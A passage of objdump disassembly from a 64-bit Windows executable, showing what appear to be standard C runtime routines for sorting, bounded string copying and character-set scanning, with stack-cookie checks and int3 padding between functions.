   14000b196:	48 8b d5             	mov    %rbp,%rdx
   14000b199:	48 8b f5             	mov    %rbp,%rsi
   14000b19c:	48 03 d2             	add    %rdx,%rdx
   14000b19f:	49 8b 94 d7 60 35 01 	mov    0x13560(%r15,%rdx,8),%rdx
   14000b1a6:	00 
   14000b1a7:	e8 e0 a6 ff ff       	call   0x14000588c
   14000b1ac:	85 c0                	test   %eax,%eax
   14000b1ae:	74 13                	je     0x14000b1c3
   14000b1b0:	79 05                	jns    0x14000b1b7
   14000b1b2:	8d 7d ff             	lea    -0x1(%rbp),%edi
   14000b1b5:	eb 03                	jmp    0x14000b1ba
   14000b1b7:	8d 5d 01             	lea    0x1(%rbp),%ebx
   14000b1ba:	3b df                	cmp    %edi,%ebx
   14000b1bc:	7e c4                	jle    0x14000b182
   14000b1be:	83 c8 ff             	or     $0xffffffff,%eax
   14000b1c1:	eb 0b                	jmp    0x14000b1ce
   14000b1c3:	48 03 f6             	add    %rsi,%rsi
   14000b1c6:	41 8b 84 f7 68 35 01 	mov    0x13568(%r15,%rsi,8),%eax
   14000b1cd:	00 
   14000b1ce:	85 c0                	test   %eax,%eax
   14000b1d0:	78 16                	js     0x14000b1e8
   14000b1d2:	3d e4 00 00 00       	cmp    $0xe4,%eax
   14000b1d7:	73 0f                	jae    0x14000b1e8
   14000b1d9:	48 98                	cltq
   14000b1db:	48 03 c0             	add    %rax,%rax
   14000b1de:	41 8b 84 c7 10 1b 01 	mov    0x11b10(%r15,%rax,8),%eax
   14000b1e5:	00 
   14000b1e6:	eb 02                	jmp    0x14000b1ea
   14000b1e8:	33 c0                	xor    %eax,%eax
   14000b1ea:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000b1ef:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000b1f4:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000b1f9:	48 83 c4 20          	add    $0x20,%rsp
   14000b1fd:	41 5f                	pop    %r15
   14000b1ff:	41 5e                	pop    %r14
   14000b201:	5f                   	pop    %rdi
   14000b202:	c3                   	ret
   14000b203:	cc                   	int3
   14000b204:	cc                   	int3
   14000b205:	cc                   	int3
   14000b206:	cc                   	int3
   14000b207:	cc                   	int3
   14000b208:	cc                   	int3
   14000b209:	cc                   	int3
   14000b20a:	cc                   	int3
   14000b20b:	cc                   	int3
   14000b20c:	cc                   	int3
   14000b20d:	cc                   	int3
   14000b20e:	cc                   	int3
   14000b20f:	cc                   	int3
   14000b210:	41 54                	push   %r12
   14000b212:	41 55                	push   %r13
   14000b214:	41 56                	push   %r14
   14000b216:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   14000b21d:	48 8b 05 dc ed 00 00 	mov    0xeddc(%rip),%rax        # 0x14001a000
   14000b224:	48 33 c4             	xor    %rsp,%rax
   14000b227:	48 89 84 24 10 04 00 	mov    %rax,0x410(%rsp)
   14000b22e:	00 
   14000b22f:	4d 8b e1             	mov    %r9,%r12
   14000b232:	4d 8b f0             	mov    %r8,%r14
   14000b235:	4c 8b e9             	mov    %rcx,%r13
   14000b238:	48 85 c9             	test   %rcx,%rcx
   14000b23b:	75 1a                	jne    0x14000b257
   14000b23d:	48 85 d2             	test   %rdx,%rdx
   14000b240:	74 15                	je     0x14000b257
   14000b242:	e8 f9 c4 ff ff       	call   0x140007740
   14000b247:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b24d:	e8 ce c3 ff ff       	call   0x140007620
   14000b252:	e9 38 03 00 00       	jmp    0x14000b58f
   14000b257:	4d 85 f6             	test   %r14,%r14
   14000b25a:	74 e6                	je     0x14000b242
   14000b25c:	4d 85 e4             	test   %r12,%r12
   14000b25f:	74 e1                	je     0x14000b242
   14000b261:	48 83 fa 02          	cmp    $0x2,%rdx
   14000b265:	0f 82 24 03 00 00    	jb     0x14000b58f
   14000b26b:	48 89 9c 24 48 04 00 	mov    %rbx,0x448(%rsp)
   14000b272:	00 
   14000b273:	48 89 ac 24 40 04 00 	mov    %rbp,0x440(%rsp)
   14000b27a:	00 
   14000b27b:	48 89 b4 24 38 04 00 	mov    %rsi,0x438(%rsp)
   14000b282:	00 
   14000b283:	48 89 bc 24 30 04 00 	mov    %rdi,0x430(%rsp)
   14000b28a:	00 
   14000b28b:	4c 89 bc 24 28 04 00 	mov    %r15,0x428(%rsp)
   14000b292:	00 
   14000b293:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
   14000b297:	4d 0f af fe          	imul   %r14,%r15
   14000b29b:	4c 03 f9             	add    %rcx,%r15
   14000b29e:	33 c9                	xor    %ecx,%ecx
   14000b2a0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000b2a5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000b2ac:	00 00 00 00 
   14000b2b0:	33 d2                	xor    %edx,%edx
   14000b2b2:	49 8b c7             	mov    %r15,%rax
   14000b2b5:	49 2b c5             	sub    %r13,%rax
   14000b2b8:	49 f7 f6             	div    %r14
   14000b2bb:	48 8d 58 01          	lea    0x1(%rax),%rbx
   14000b2bf:	48 83 fb 08          	cmp    $0x8,%rbx
   14000b2c3:	0f 87 8b 00 00 00    	ja     0x14000b354
   14000b2c9:	4d 3b fd             	cmp    %r13,%r15
   14000b2cc:	76 65                	jbe    0x14000b333
   14000b2ce:	4b 8d 34 2e          	lea    (%r14,%r13,1),%rsi
   14000b2d2:	49 8b dd             	mov    %r13,%rbx
   14000b2d5:	48 8b fe             	mov    %rsi,%rdi
   14000b2d8:	49 3b f7             	cmp    %r15,%rsi
   14000b2db:	77 20                	ja     0x14000b2fd
   14000b2dd:	0f 1f 00             	nopl   (%rax)
   14000b2e0:	48 8b d3             	mov    %rbx,%rdx
   14000b2e3:	48 8b cf             	mov    %rdi,%rcx
   14000b2e6:	49 8b c4             	mov    %r12,%rax
   14000b2e9:	ff 15 69 41 00 00    	call   *0x4169(%rip)        # 0x14000f458
   14000b2ef:	85 c0                	test   %eax,%eax
   14000b2f1:	48 0f 4f df          	cmovg  %rdi,%rbx
   14000b2f5:	49 03 fe             	add    %r14,%rdi
   14000b2f8:	49 3b ff             	cmp    %r15,%rdi
   14000b2fb:	76 e3                	jbe    0x14000b2e0
   14000b2fd:	4d 8b c6             	mov    %r14,%r8
   14000b300:	49 8b d7             	mov    %r15,%rdx
   14000b303:	49 3b df             	cmp    %r15,%rbx
   14000b306:	74 1e                	je     0x14000b326
   14000b308:	49 2b df             	sub    %r15,%rbx
   14000b30b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000b310:	0f b6 02             	movzbl (%rdx),%eax
   14000b313:	0f b6 0c 13          	movzbl (%rbx,%rdx,1),%ecx
   14000b317:	88 04 13             	mov    %al,(%rbx,%rdx,1)
   14000b31a:	88 0a                	mov    %cl,(%rdx)
   14000b31c:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000b320:	49 83 e8 01          	sub    $0x1,%r8
   14000b324:	75 ea                	jne    0x14000b310
   14000b326:	4d 2b fe             	sub    %r14,%r15
   14000b329:	4d 3b fd             	cmp    %r13,%r15
   14000b32c:	77 a4                	ja     0x14000b2d2
   14000b32e:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000b333:	48 83 e9 01          	sub    $0x1,%rcx
   14000b337:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000b33c:	0f 88 25 02 00 00    	js     0x14000b567
   14000b342:	4c 8b 6c cc 30       	mov    0x30(%rsp,%rcx,8),%r13
   14000b347:	4c 8b bc cc 20 02 00 	mov    0x220(%rsp,%rcx,8),%r15
   14000b34e:	00 
   14000b34f:	e9 5c ff ff ff       	jmp    0x14000b2b0
   14000b354:	48 d1 eb             	shr    $1,%rbx
   14000b357:	49 8b cd             	mov    %r13,%rcx
   14000b35a:	49 0f af de          	imul   %r14,%rbx
   14000b35e:	49 8b c4             	mov    %r12,%rax
   14000b361:	4a 8d 34 2b          	lea    (%rbx,%r13,1),%rsi
   14000b365:	48 8b d6             	mov    %rsi,%rdx
   14000b368:	ff 15 ea 40 00 00    	call   *0x40ea(%rip)        # 0x14000f458
   14000b36e:	85 c0                	test   %eax,%eax
   14000b370:	7e 29                	jle    0x14000b39b
   14000b372:	4d 8b ce             	mov    %r14,%r9
   14000b375:	4c 8b c6             	mov    %rsi,%r8
   14000b378:	4c 3b ee             	cmp    %rsi,%r13
   14000b37b:	74 1e                	je     0x14000b39b
   14000b37d:	0f 1f 00             	nopl   (%rax)
   14000b380:	41 0f b6 00          	movzbl (%r8),%eax
   14000b384:	49 8b d0             	mov    %r8,%rdx
   14000b387:	48 2b d3             	sub    %rbx,%rdx
   14000b38a:	0f b6 0a             	movzbl (%rdx),%ecx
   14000b38d:	88 02                	mov    %al,(%rdx)
   14000b38f:	41 88 08             	mov    %cl,(%r8)
   14000b392:	49 ff c0             	inc    %r8
   14000b395:	49 83 e9 01          	sub    $0x1,%r9
   14000b399:	75 e5                	jne    0x14000b380
   14000b39b:	49 8b d7             	mov    %r15,%rdx
   14000b39e:	49 8b cd             	mov    %r13,%rcx
   14000b3a1:	49 8b c4             	mov    %r12,%rax
   14000b3a4:	ff 15 ae 40 00 00    	call   *0x40ae(%rip)        # 0x14000f458
   14000b3aa:	85 c0                	test   %eax,%eax
   14000b3ac:	7e 2a                	jle    0x14000b3d8
   14000b3ae:	4d 8b c6             	mov    %r14,%r8
   14000b3b1:	49 8b d7             	mov    %r15,%rdx
   14000b3b4:	4d 3b ef             	cmp    %r15,%r13
   14000b3b7:	74 1f                	je     0x14000b3d8
   14000b3b9:	4d 8b cd             	mov    %r13,%r9
   14000b3bc:	4d 2b cf             	sub    %r15,%r9
   14000b3bf:	90                   	nop
   14000b3c0:	0f b6 02             	movzbl (%rdx),%eax
   14000b3c3:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000b3c8:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000b3cc:	88 0a                	mov    %cl,(%rdx)
   14000b3ce:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000b3d2:	49 83 e8 01          	sub    $0x1,%r8
   14000b3d6:	75 e8                	jne    0x14000b3c0
   14000b3d8:	49 8b d7             	mov    %r15,%rdx
   14000b3db:	48 8b ce             	mov    %rsi,%rcx
   14000b3de:	49 8b c4             	mov    %r12,%rax
   14000b3e1:	ff 15 71 40 00 00    	call   *0x4071(%rip)        # 0x14000f458
   14000b3e7:	85 c0                	test   %eax,%eax
   14000b3e9:	7e 2d                	jle    0x14000b418
   14000b3eb:	4d 8b c6             	mov    %r14,%r8
   14000b3ee:	49 8b d7             	mov    %r15,%rdx
   14000b3f1:	49 3b f7             	cmp    %r15,%rsi
   14000b3f4:	74 22                	je     0x14000b418
   14000b3f6:	4c 8b ce             	mov    %rsi,%r9
   14000b3f9:	4d 2b cf             	sub    %r15,%r9
   14000b3fc:	0f 1f 40 00          	nopl   0x0(%rax)
   14000b400:	0f b6 02             	movzbl (%rdx),%eax
   14000b403:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000b408:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000b40c:	88 0a                	mov    %cl,(%rdx)
   14000b40e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000b412:	49 83 e8 01          	sub    $0x1,%r8
   14000b416:	75 e8                	jne    0x14000b400
   14000b418:	49 8b dd             	mov    %r13,%rbx
   14000b41b:	49 8b ff             	mov    %r15,%rdi
   14000b41e:	66 90                	xchg   %ax,%ax
   14000b420:	48 3b f3             	cmp    %rbx,%rsi
   14000b423:	76 1d                	jbe    0x14000b442
   14000b425:	49 03 de             	add    %r14,%rbx
   14000b428:	48 3b de             	cmp    %rsi,%rbx
   14000b42b:	73 15                	jae    0x14000b442
   14000b42d:	48 8b d6             	mov    %rsi,%rdx
   14000b430:	48 8b cb             	mov    %rbx,%rcx
   14000b433:	49 8b c4             	mov    %r12,%rax
   14000b436:	ff 15 1c 40 00 00    	call   *0x401c(%rip)        # 0x14000f458
   14000b43c:	85 c0                	test   %eax,%eax
   14000b43e:	7e e5                	jle    0x14000b425
   14000b440:	eb 1e                	jmp    0x14000b460
   14000b442:	49 03 de             	add    %r14,%rbx
   14000b445:	49 3b df             	cmp    %r15,%rbx
   14000b448:	77 16                	ja     0x14000b460
   14000b44a:	48 8b d6             	mov    %rsi,%rdx
   14000b44d:	48 8b cb             	mov    %rbx,%rcx
   14000b450:	49 8b c4             	mov    %r12,%rax
   14000b453:	ff 15 ff 3f 00 00    	call   *0x3fff(%rip)        # 0x14000f458
   14000b459:	85 c0                	test   %eax,%eax
   14000b45b:	7e e5                	jle    0x14000b442
   14000b45d:	0f 1f 00             	nopl   (%rax)
   14000b460:	48 8b ef             	mov    %rdi,%rbp
   14000b463:	49 2b fe             	sub    %r14,%rdi
   14000b466:	48 3b fe             	cmp    %rsi,%rdi
   14000b469:	76 13                	jbe    0x14000b47e
   14000b46b:	48 8b d6             	mov    %rsi,%rdx
   14000b46e:	48 8b cf             	mov    %rdi,%rcx
   14000b471:	49 8b c4             	mov    %r12,%rax
   14000b474:	ff 15 de 3f 00 00    	call   *0x3fde(%rip)        # 0x14000f458
   14000b47a:	85 c0                	test   %eax,%eax
   14000b47c:	7f e2                	jg     0x14000b460
   14000b47e:	48 3b fb             	cmp    %rbx,%rdi
   14000b481:	72 38                	jb     0x14000b4bb
   14000b483:	4d 8b c6             	mov    %r14,%r8
   14000b486:	48 8b d7             	mov    %rdi,%rdx
   14000b489:	74 1e                	je     0x14000b4a9
   14000b48b:	4c 8b cb             	mov    %rbx,%r9
   14000b48e:	4c 2b cf             	sub    %rdi,%r9
   14000b491:	0f b6 02             	movzbl (%rdx),%eax
   14000b494:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000b499:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000b49d:	88 0a                	mov    %cl,(%rdx)
   14000b49f:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000b4a3:	49 83 e8 01          	sub    $0x1,%r8
   14000b4a7:	75 e8                	jne    0x14000b491
   14000b4a9:	48 3b f7             	cmp    %rdi,%rsi
   14000b4ac:	48 8b c3             	mov    %rbx,%rax
   14000b4af:	48 0f 45 c6          	cmovne %rsi,%rax
   14000b4b3:	48 8b f0             	mov    %rax,%rsi
   14000b4b6:	e9 65 ff ff ff       	jmp    0x14000b420
   14000b4bb:	48 3b f5             	cmp    %rbp,%rsi
   14000b4be:	73 20                	jae    0x14000b4e0
   14000b4c0:	49 2b ee             	sub    %r14,%rbp
   14000b4c3:	48 3b ee             	cmp    %rsi,%rbp
   14000b4c6:	76 18                	jbe    0x14000b4e0
   14000b4c8:	48 8b d6             	mov    %rsi,%rdx
   14000b4cb:	48 8b cd             	mov    %rbp,%rcx
   14000b4ce:	49 8b c4             	mov    %r12,%rax
   14000b4d1:	ff 15 81 3f 00 00    	call   *0x3f81(%rip)        # 0x14000f458
   14000b4d7:	85 c0                	test   %eax,%eax
   14000b4d9:	74 e5                	je     0x14000b4c0
   14000b4db:	eb 1e                	jmp    0x14000b4fb
   14000b4dd:	0f 1f 00             	nopl   (%rax)
   14000b4e0:	49 2b ee             	sub    %r14,%rbp
   14000b4e3:	49 3b ed             	cmp    %r13,%rbp
   14000b4e6:	76 13                	jbe    0x14000b4fb
   14000b4e8:	48 8b d6             	mov    %rsi,%rdx
   14000b4eb:	48 8b cd             	mov    %rbp,%rcx
   14000b4ee:	49 8b c4             	mov    %r12,%rax
   14000b4f1:	ff 15 61 3f 00 00    	call   *0x3f61(%rip)        # 0x14000f458
   14000b4f7:	85 c0                	test   %eax,%eax
   14000b4f9:	74 e5                	je     0x14000b4e0
   14000b4fb:	49 8b cf             	mov    %r15,%rcx
   14000b4fe:	48 8b c5             	mov    %rbp,%rax
   14000b501:	48 2b cb             	sub    %rbx,%rcx
   14000b504:	49 2b c5             	sub    %r13,%rax
   14000b507:	48 3b c1             	cmp    %rcx,%rax
   14000b50a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000b50f:	7c 2b                	jl     0x14000b53c
   14000b511:	4c 3b ed             	cmp    %rbp,%r13
   14000b514:	73 15                	jae    0x14000b52b
   14000b516:	4c 89 6c cc 30       	mov    %r13,0x30(%rsp,%rcx,8)
   14000b51b:	48 89 ac cc 20 02 00 	mov    %rbp,0x220(%rsp,%rcx,8)
   14000b522:	00 
   14000b523:	48 ff c1             	inc    %rcx
   14000b526:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000b52b:	49 3b df             	cmp    %r15,%rbx
   14000b52e:	0f 83 ff fd ff ff    	jae    0x14000b333
   14000b534:	4c 8b eb             	mov    %rbx,%r13
   14000b537:	e9 74 fd ff ff       	jmp    0x14000b2b0
   14000b53c:	49 3b df             	cmp    %r15,%rbx
   14000b53f:	73 15                	jae    0x14000b556
   14000b541:	48 89 5c cc 30       	mov    %rbx,0x30(%rsp,%rcx,8)
   14000b546:	4c 89 bc cc 20 02 00 	mov    %r15,0x220(%rsp,%rcx,8)
   14000b54d:	00 
   14000b54e:	48 ff c1             	inc    %rcx
   14000b551:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000b556:	4c 3b ed             	cmp    %rbp,%r13
   14000b559:	0f 83 d4 fd ff ff    	jae    0x14000b333
   14000b55f:	4c 8b fd             	mov    %rbp,%r15
   14000b562:	e9 49 fd ff ff       	jmp    0x14000b2b0
   14000b567:	48 8b bc 24 30 04 00 	mov    0x430(%rsp),%rdi
   14000b56e:	00 
   14000b56f:	48 8b b4 24 38 04 00 	mov    0x438(%rsp),%rsi
   14000b576:	00 
   14000b577:	48 8b ac 24 40 04 00 	mov    0x440(%rsp),%rbp
   14000b57e:	00 
   14000b57f:	48 8b 9c 24 48 04 00 	mov    0x448(%rsp),%rbx
   14000b586:	00 
   14000b587:	4c 8b bc 24 28 04 00 	mov    0x428(%rsp),%r15
   14000b58e:	00 
   14000b58f:	48 8b 8c 24 10 04 00 	mov    0x410(%rsp),%rcx
   14000b596:	00 
   14000b597:	48 33 cc             	xor    %rsp,%rcx
   14000b59a:	e8 91 7b ff ff       	call   0x140003130
   14000b59f:	48 81 c4 50 04 00 00 	add    $0x450,%rsp
   14000b5a6:	41 5e                	pop    %r14
   14000b5a8:	41 5d                	pop    %r13
   14000b5aa:	41 5c                	pop    %r12
   14000b5ac:	c3                   	ret
   14000b5ad:	cc                   	int3
   14000b5ae:	cc                   	int3
   14000b5af:	cc                   	int3
   14000b5b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b5b5:	57                   	push   %rdi
   14000b5b6:	48 83 ec 20          	sub    $0x20,%rsp
   14000b5ba:	45 33 d2             	xor    %r10d,%r10d
   14000b5bd:	49 8b d8             	mov    %r8,%rbx
   14000b5c0:	4c 8b da             	mov    %rdx,%r11
   14000b5c3:	4d 85 c9             	test   %r9,%r9
   14000b5c6:	75 2c                	jne    0x14000b5f4
   14000b5c8:	48 85 c9             	test   %rcx,%rcx
   14000b5cb:	75 2c                	jne    0x14000b5f9
   14000b5cd:	48 85 d2             	test   %rdx,%rdx
   14000b5d0:	74 14                	je     0x14000b5e6
   14000b5d2:	e8 69 c1 ff ff       	call   0x140007740
   14000b5d7:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000b5dc:	89 18                	mov    %ebx,(%rax)
   14000b5de:	e8 3d c0 ff ff       	call   0x140007620
   14000b5e3:	44 8b d3             	mov    %ebx,%r10d
   14000b5e6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b5eb:	41 8b c2             	mov    %r10d,%eax
   14000b5ee:	48 83 c4 20          	add    $0x20,%rsp
   14000b5f2:	5f                   	pop    %rdi
   14000b5f3:	c3                   	ret
   14000b5f4:	48 85 c9             	test   %rcx,%rcx
   14000b5f7:	74 d9                	je     0x14000b5d2
   14000b5f9:	4d 85 db             	test   %r11,%r11
   14000b5fc:	74 d4                	je     0x14000b5d2
   14000b5fe:	4d 85 c9             	test   %r9,%r9
   14000b601:	75 05                	jne    0x14000b608
   14000b603:	44 88 11             	mov    %r10b,(%rcx)
   14000b606:	eb de                	jmp    0x14000b5e6
   14000b608:	48 85 db             	test   %rbx,%rbx
   14000b60b:	75 05                	jne    0x14000b612
   14000b60d:	44 88 11             	mov    %r10b,(%rcx)
   14000b610:	eb c0                	jmp    0x14000b5d2
   14000b612:	48 2b d9             	sub    %rcx,%rbx
   14000b615:	48 8b d1             	mov    %rcx,%rdx
   14000b618:	4d 8b c3             	mov    %r11,%r8
   14000b61b:	49 8b f9             	mov    %r9,%rdi
   14000b61e:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   14000b622:	75 14                	jne    0x14000b638
   14000b624:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   14000b627:	88 02                	mov    %al,(%rdx)
   14000b629:	48 ff c2             	inc    %rdx
   14000b62c:	84 c0                	test   %al,%al
   14000b62e:	74 28                	je     0x14000b658
   14000b630:	49 83 e8 01          	sub    $0x1,%r8
   14000b634:	75 ee                	jne    0x14000b624
   14000b636:	eb 20                	jmp    0x14000b658
   14000b638:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   14000b63b:	88 02                	mov    %al,(%rdx)
   14000b63d:	48 ff c2             	inc    %rdx
   14000b640:	84 c0                	test   %al,%al
   14000b642:	74 0c                	je     0x14000b650
   14000b644:	49 83 e8 01          	sub    $0x1,%r8
   14000b648:	74 06                	je     0x14000b650
   14000b64a:	48 83 ef 01          	sub    $0x1,%rdi
   14000b64e:	75 e8                	jne    0x14000b638
   14000b650:	48 85 ff             	test   %rdi,%rdi
   14000b653:	75 03                	jne    0x14000b658
   14000b655:	44 88 12             	mov    %r10b,(%rdx)
   14000b658:	4d 85 c0             	test   %r8,%r8
   14000b65b:	75 89                	jne    0x14000b5e6
   14000b65d:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   14000b661:	75 0e                	jne    0x14000b671
   14000b663:	46 88 54 19 ff       	mov    %r10b,-0x1(%rcx,%r11,1)
   14000b668:	45 8d 50 50          	lea    0x50(%r8),%r10d
   14000b66c:	e9 75 ff ff ff       	jmp    0x14000b5e6
   14000b671:	44 88 11             	mov    %r10b,(%rcx)
   14000b674:	e8 c7 c0 ff ff       	call   0x140007740
   14000b679:	bb 22 00 00 00       	mov    $0x22,%ebx
   14000b67e:	e9 59 ff ff ff       	jmp    0x14000b5dc
   14000b683:	cc                   	int3
   14000b684:	48 83 ec 58          	sub    $0x58,%rsp
   14000b688:	48 8b 05 71 e9 00 00 	mov    0xe971(%rip),%rax        # 0x14001a000
   14000b68f:	48 33 c4             	xor    %rsp,%rax
   14000b692:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000b697:	33 c0                	xor    %eax,%eax
   14000b699:	4c 8b ca             	mov    %rdx,%r9
   14000b69c:	48 83 f8 20          	cmp    $0x20,%rax
   14000b6a0:	4c 8b c1             	mov    %rcx,%r8
   14000b6a3:	73 77                	jae    0x14000b71c
   14000b6a5:	c6 44 04 20 00       	movb   $0x0,0x20(%rsp,%rax,1)
   14000b6aa:	48 ff c0             	inc    %rax
   14000b6ad:	48 83 f8 20          	cmp    $0x20,%rax
   14000b6b1:	7c f0                	jl     0x14000b6a3
   14000b6b3:	8a 02                	mov    (%rdx),%al
   14000b6b5:	eb 1f                	jmp    0x14000b6d6
   14000b6b7:	0f b6 d0             	movzbl %al,%edx
   14000b6ba:	48 c1 ea 03          	shr    $0x3,%rdx
   14000b6be:	0f b6 c0             	movzbl %al,%eax
   14000b6c1:	83 e0 07             	and    $0x7,%eax
   14000b6c4:	0f b6 4c 14 20       	movzbl 0x20(%rsp,%rdx,1),%ecx
   14000b6c9:	0f ab c1             	bts    %eax,%ecx
   14000b6cc:	49 ff c1             	inc    %r9
   14000b6cf:	88 4c 14 20          	mov    %cl,0x20(%rsp,%rdx,1)
   14000b6d3:	41 8a 01             	mov    (%r9),%al
   14000b6d6:	84 c0                	test   %al,%al
   14000b6d8:	75 dd                	jne    0x14000b6b7
   14000b6da:	eb 1f                	jmp    0x14000b6fb
   14000b6dc:	41 0f b6 c1          	movzbl %r9b,%eax
   14000b6e0:	ba 01 00 00 00       	mov    $0x1,%edx
   14000b6e5:	41 0f b6 c9          	movzbl %r9b,%ecx
   14000b6e9:	83 e1 07             	and    $0x7,%ecx
   14000b6ec:	48 c1 e8 03          	shr    $0x3,%rax
   14000b6f0:	d3 e2                	shl    %cl,%edx
   14000b6f2:	84 54 04 20          	test   %dl,0x20(%rsp,%rax,1)
   14000b6f6:	75 1f                	jne    0x14000b717
   14000b6f8:	49 ff c0             	inc    %r8
   14000b6fb:	45 8a 08             	mov    (%r8),%r9b
   14000b6fe:	45 84 c9             	test   %r9b,%r9b
   14000b701:	75 d9                	jne    0x14000b6dc
   14000b703:	33 c0                	xor    %eax,%eax
   14000b705:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000b70a:	48 33 cc             	xor    %rsp,%rcx
   14000b70d:	e8 1e 7a ff ff       	call   0x140003130
   14000b712:	48 83 c4 58          	add    $0x58,%rsp
   14000b716:	c3                   	ret
   14000b717:	49 8b c0             	mov    %r8,%rax
   14000b71a:	eb e9                	jmp    0x14000b705
   14000b71c:	e8 ef 7d ff ff       	call   0x140003510
   14000b721:	cc                   	int3
   14000b722:	cc                   	int3
   14000b723:	cc                   	int3
   14000b724:	cc                   	int3
   14000b725:	cc                   	int3
   14000b726:	cc                   	int3
   14000b727:	cc                   	int3
   14000b728:	cc                   	int3
   14000b729:	cc                   	int3
   14000b72a:	cc                   	int3
   14000b72b:	cc                   	int3
   14000b72c:	cc                   	int3
   14000b72d:	cc                   	int3
   14000b72e:	cc                   	int3
   14000b72f:	cc                   	int3
   14000b730:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b735:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000b73a:	57                   	push   %rdi
   14000b73b:	4c 8b d2             	mov    %rdx,%r10
   14000b73e:	48 8d 35 bb 48 ff ff 	lea    -0xb745(%rip),%rsi        # 0x140000000
   14000b745:	41 83 e2 0f          	and    $0xf,%r10d
   14000b749:	48 8b fa             	mov    %rdx,%rdi
   14000b74c:	49 2b fa             	sub    %r10,%rdi
   14000b74f:	48 8b da             	mov    %rdx,%rbx
   14000b752:	4c 8b c1             	mov    %rcx,%r8
   14000b755:	0f 57 db             	xorps  %xmm3,%xmm3
   14000b758:	49 8d 42 ff          	lea    -0x1(%r10),%rax
   14000b75c:	f3 0f 6f 0f          	movdqu (%rdi),%xmm1
   14000b760:	48 83 f8 0e          	cmp    $0xe,%rax
   14000b764:	77 73                	ja     0x14000b7d9
   14000b766:	8b 84 86 3c ba 00 00 	mov    0xba3c(%rsi,%rax,4),%eax
   14000b76d:	48 03 c6             	add    %rsi,%rax
   14000b770:	ff e0                	jmp    *%rax
   14000b772:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   14000b777:	eb 60                	jmp    0x14000b7d9
   14000b779:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   14000b77e:	eb 59                	jmp    0x14000b7d9
   14000b780:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   14000b785:	eb 52                	jmp    0x14000b7d9
   14000b787:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   14000b78c:	eb 4b                	jmp    0x14000b7d9
   14000b78e:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   14000b793:	eb 44                	jmp    0x14000b7d9
   14000b795:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   14000b79a:	eb 3d                	jmp    0x14000b7d9
   14000b79c:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   14000b7a1:	eb 36                	jmp    0x14000b7d9
   14000b7a3:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   14000b7a8:	eb 2f                	jmp    0x14000b7d9
   14000b7aa:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   14000b7af:	eb 28                	jmp    0x14000b7d9
   14000b7b1:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   14000b7b6:	eb 21                	jmp    0x14000b7d9
   14000b7b8:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   14000b7bd:	eb 1a                	jmp    0x14000b7d9
   14000b7bf:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   14000b7c4:	eb 13                	jmp    0x14000b7d9
   14000b7c6:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   14000b7cb:	eb 0c                	jmp    0x14000b7d9
   14000b7cd:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   14000b7d2:	eb 05                	jmp    0x14000b7d9
   14000b7d4:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   14000b7d9:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000b7dc:	41 b9 0f 00 00 00    	mov    $0xf,%r9d
   14000b7e2:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   14000b7e6:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000b7ea:	85 c0                	test   %eax,%eax
   14000b7ec:	0f 84 33 01 00 00    	je     0x14000b925
   14000b7f2:	0f bc d0             	bsf    %eax,%edx
   14000b7f5:	4d 85 d2             	test   %r10,%r10
   14000b7f8:	75 06                	jne    0x14000b800
   14000b7fa:	45 8d 59 f2          	lea    -0xe(%r9),%r11d
   14000b7fe:	eb 14                	jmp    0x14000b814
   14000b800:	45 33 db             	xor    %r11d,%r11d
   14000b803:	8b c2                	mov    %edx,%eax
   14000b805:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000b80a:	49 2b ca             	sub    %r10,%rcx
